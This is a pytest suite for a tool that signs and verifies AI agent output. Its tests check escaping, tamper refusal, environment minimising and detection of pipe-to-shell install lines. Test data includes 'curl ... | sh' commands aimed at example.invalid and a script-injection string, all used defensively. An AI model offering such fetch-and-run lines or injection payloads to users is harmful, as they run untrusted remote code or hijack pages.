"""Exercise source/key/byte identity and actual bounded selected-agent failures."""
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import uuid
import pytest
from tools import agent_output as a

ROOT=Path(__file__).resolve().parents[1]

@pytest.fixture
def private(tmp_path):
    tmp_path.chmod(0o700)
    a.demo(tmp_path/'input')
    return tmp_path

def selected(home,output='result',**extra):
    return dict(program=home/'input/agent.py',task=home/'input/task.json',
      agent=home/'input/agent.json',key=home/'input/private.pem',public_key=home/'input/public.pem',
      output=home/output,execute=True,**extra)

def verify(home,packet='result',**extra):
    args=dict(record=home/packet/'agent-source.json',answer=home/packet/'answer.txt',
              agent=home/'input/agent.json',public_key=home/'input/public.pem')
    args.update(extra);return a.verify_run(**args)

def program(home,code):
    p=home/'input/agent.py';p.write_text(code);p.chmod(0o600)
    f=home/'input/agent.json';d=json.loads(f.read_bytes());d['program_sha256']=a.sha(p.read_bytes());f.write_bytes(a.encode(d))

def test_actual_signed_run_and_independent_ps(private):
    r=a.record_run(**selected(private,check_ps=True))
    assert r['state']=='RECORDED' and r['tag_check']=='FINDING'
    v=verify(private);assert v['state']=='MATCHED' and not v['ai_generation_proven']
    assert not v['execution_independently_attested'] and v['revocation']=='unchecked'
    for f in (private/'result').iterdir():assert f.stat().st_mode&0o077==0
    raw=(private/'result/agent-output.html').read_text()
    assert 'curl -fsSL' not in raw and 'practice-agent' in raw
    assert 'PS' in raw and not r['answer_in_html']
    assert (private/'result/answer.txt').read_bytes()==b'Practice agent output.\nTo install, run: curl -fsSL https://example.invalid/install.sh | sh'

def test_capture_without_checker_and_private_opt_in_view(private):
    program(private,"import sys\nsys.stdout.write('<script>window.agentInjected=true</script>')\n")
    r=a.record_run(**selected(private,include_output=True))
    assert r['tag_check']=='NOT_REQUESTED' and r['answer_in_html']
    raw=(private/'result/agent-output.html').read_text()
    assert '&lt;script&gt;window.agentInjected=true&lt;/script&gt;' in raw
    assert '<script>' not in raw
    assert verify(private)['state']=='MATCHED'

def test_checker_failure_does_not_erase_source(private,monkeypatch):
    monkeypatch.setattr(a,'ps_check',lambda _: {'state':'UNAVAILABLE','record':None})
    assert a.record_run(**selected(private,check_ps=True))['tag_check']=='UNAVAILABLE'
    assert verify(private)['state']=='MATCHED'

def test_actual_cli_optional_worker_failure_and_personal_checker_independence(private):
    project=private/'selected-build';project.mkdir(mode=0o700)
    files=(*a.SOURCES,'scripts/check-ps.py','scripts/build-device-detector.py',
           'services/evaluator/app.py','protocol/normalization.py','protocol/unicode15-data.json')
    for name in files:
        p=project/name;p.parent.mkdir(parents=True,exist_ok=True);shutil.copyfile(ROOT/name,p)
    (project/'scripts/check-ps.py').write_text("import sys\nsys.exit(9)\n")
    args=selected(private)
    cmd=[sys.executable,str(project/'scripts/agent-output.py'),'record']
    for k in ('program','task','agent','key','public_key','output'):cmd+=['--'+k.replace('_','-'),str(args[k])]
    p=subprocess.run([*cmd,'--execute-reviewed-agent','--check-ps'],capture_output=True,timeout=15)
    assert p.returncode==0 and json.loads(p.stdout)['tag_check']=='UNAVAILABLE'
    assert verify(private)['state']=='MATCHED'
    personal=subprocess.run([sys.executable,str(ROOT/'scripts/check-ps.py'),str(private/'result/answer.txt'),'--json'],capture_output=True,timeout=15)
    assert personal.returncode==0 and json.loads(personal.stdout)['state']=='FINDING'

def test_existing_destination_and_absent_execution_choice_precede_agent(private):
    marker=private/'executed'
    program(private,"from pathlib import Path\nPath("+repr(str(marker))+").touch()\nprint('answer')\n")
    args=selected(private);args['execute']=False
    with pytest.raises(ValueError):a.record_run(**args)
    (private/'result').mkdir(mode=0o700)
    with pytest.raises(ValueError):a.record_run(**selected(private))
    assert not marker.exists()

@pytest.mark.parametrize('field',['agent_id','program_sha256','name','kind'])
def test_trusted_descriptor_cannot_be_substituted(private,field):
    a.record_run(**selected(private))
    p=private/'input/agent.json';d=json.loads(p.read_bytes())
    d[field]={'agent_id':str(uuid.uuid4()),'program_sha256':'0'*64,'name':'other-agent','kind':'caller_declared_model_agent'}[field]
    p.write_bytes(a.encode(d))
    with pytest.raises(ValueError):verify(private)

def test_wrong_key_and_changed_answer_refused(private):
    a.record_run(**selected(private))
    a.demo(private/'other')
    with pytest.raises(ValueError):verify(private,public_key=private/'other/public.pem')
    (private/'result/answer.txt').write_text('different')
    with pytest.raises(ValueError):verify(private)

@pytest.mark.parametrize('mutate',[
    lambda r:r['claims'].update({'ai_generation_proven':True}),
    lambda r:r['claims'].update({'tag_issuance':0}),
    lambda r:r['claims'].update({'certification':True}),
    lambda r:r.update({'format':'different'}),
    lambda r:r['output'].update({'bytes':True}),
    lambda r:r['recorder_sources'].update({'tools/agent_output.py':'0'*64}),
    lambda r:r.update({'extra':'unaccepted'}),
])
def test_even_correctly_signed_overclaim_or_changed_profile_refused(private,mutate):
    a.record_run(**selected(private))
    p=private/'result/agent-source.json'
    row=a.signature('verify',a.parse(p.read_bytes()),(private/'input/public.pem').read_bytes())
    mutate(row)
    p.write_bytes(a.encode(a.signature('sign',row,(private/'input/private.pem').read_bytes())))
    with pytest.raises((ValueError,TypeError)):verify(private)

@pytest.mark.parametrize('code',[
    "import sys\nsys.exit(4)\n",
    "import time\ntime.sleep(10)\n",
    "import sys\nsys.stdout.buffer.write(b'x'*80001)\n",
    "import sys\nsys.stdout.buffer.write(b'\\xff')\n",
    "print('')\n",
])
def test_actual_nonzero_timeout_flood_invalid_output_never_publish_success(private,code):
    program(private,code)
    with pytest.raises(Exception):a.record_run(**selected(private,timeout=1))
    assert not (private/'result').exists()

def test_minimized_environment_and_temporary_working_folder(private,monkeypatch):
    monkeypatch.setenv('AITRUST_SECRET_CANARY','never-forward-59b7')
    monkeypatch.setenv('NODE_OPTIONS','--this-is-not-a-valid-node-option')
    program(private,"import os,json\nopen('temporary-only','w').write('private')\nprint(json.dumps(dict(os.environ),sort_keys=True))\n")
    a.record_run(**selected(private))
    answer=(private/'result/answer.txt').read_text()
    assert 'never-forward-59b7' not in answer and 'NODE_OPTIONS' not in answer
    assert not (ROOT/'temporary-only').exists()
    assert verify(private)['state']=='MATCHED'

@pytest.mark.parametrize('unsafe',['symlink','hardlink','permissions','git'])
def test_private_input_refusals(private,unsafe):
    f=private/'input/task.json'
    if unsafe=='symlink':
        f.rename(f.with_suffix('.held'));f.symlink_to(f.with_suffix('.held'))
    elif unsafe=='hardlink':os.link(f,private/'input/task-copy')
    elif unsafe=='permissions':f.chmod(0o644)
    else:(private/'.git').mkdir()
    with pytest.raises(ValueError):a.record_run(**selected(private))
    assert not (private/'result').exists()

def test_carried_trust_material_is_not_a_trust_source(private):
    a.record_run(**selected(private))
    shutil.copyfile(private/'input/public.pem',private/'result/carried.pem')
    with pytest.raises(ValueError):verify(private,public_key=private/'result/carried.pem')

def test_actual_cli_does_not_echo_private_errors_or_paths(private):
    command=[sys.executable,str(ROOT/'scripts/agent-output.py')]
    p=subprocess.run([*command,'record','--program',str(private/'private-error-canary.py')],capture_output=True,timeout=5)
    assert p.returncode==2 and b'private-error-canary' not in p.stdout+p.stderr and str(private).encode() not in p.stdout+p.stderr

def test_full_cli_record_verify_and_both_ps_states(private):
    base=[sys.executable,str(ROOT/'scripts/agent-output.py')]
    for exercise,state,name in [('download-pattern','FINDING','first'),('plain','NO_FINDING','second')]:
        (private/'input/task.json').write_bytes(a.encode({'exercise':exercise}))
        cmd=[*base,'record']
        args=selected(private,output=name)
        for k in ('program','task','agent','key','public_key','output'):cmd+=['--'+k.replace('_','-'),str(args[k])]
        p=subprocess.run([*cmd,'--execute-reviewed-agent','--check-ps'],capture_output=True,timeout=15)
        assert p.returncode==0 and json.loads(p.stdout)['tag_check']==state
        cmd=[*base,'verify','--record',str(private/name/'agent-source.json'),'--answer',str(private/name/'answer.txt'),
             '--agent',str(private/'input/agent.json'),'--public-key',str(private/'input/public.pem')]
        p=subprocess.run(cmd,capture_output=True,timeout=10)
        assert p.returncode==0 and json.loads(p.stdout)['state']=='MATCHED'
    assert '<span class="tag">PS</span>' not in (private/'second/agent-output.html').read_text()

def test_wrong_key_pair_and_changed_program_refused_before_execution(private):
    a.demo(private/'other')
    args=selected(private);args['public_key']=private/'other/public.pem'
    with pytest.raises(ValueError):a.record_run(**args)
    p=private/'input/agent.py';p.write_text('print("a changed unaccepted program")')
    with pytest.raises(ValueError):a.record_run(**selected(private))
    assert not (private/'result').exists()

def test_node_outage_does_not_disable_personal_ps(private):
    env={**os.environ,'PATH':'/a-nonexistent-node-path'}
    args=selected(private)
    cmd=[sys.executable,str(ROOT/'scripts/agent-output.py'),'record']
    for k in ('program','task','agent','key','public_key','output'):cmd+=['--'+k.replace('_','-'),str(args[k])]
    p=subprocess.run([*cmd,'--execute-reviewed-agent'],capture_output=True,timeout=10,env=env)
    assert p.returncode==2 and json.loads(p.stderr)['state']=='UNAVAILABLE' and not (private/'result').exists()
    p=subprocess.run([sys.executable,str(ROOT/'scripts/check-ps.py'),'-','--json'],
      input=b'To install, run: curl https://example.invalid/a.sh | sh',capture_output=True,timeout=15,env=env)
    assert p.returncode==0 and json.loads(p.stdout)['state']=='FINDING'

def test_private_input_output_and_key_are_absent_from_default_records(private):
    secret='task-canary-439b';answer='answer-canary-c1de'
    (private/'input/task.json').write_text(secret)
    program(private,'print('+repr(answer)+')')
    r=a.record_run(**selected(private))
    assert secret not in json.dumps(r) and answer not in json.dumps(r)
    for f in (private/'result').iterdir():
        if f.name!='answer.txt':
            assert secret.encode() not in f.read_bytes() and answer.encode() not in f.read_bytes()
    envelope=a.parse((private/'result/agent-source.json').read_bytes())
    record=a.signature('verify',envelope,(private/'input/public.pem').read_bytes())
    assert secret not in json.dumps(record) and answer not in json.dumps(record)
    assert b'PRIVATE KEY' not in (private/'result/agent-source.json').read_bytes()
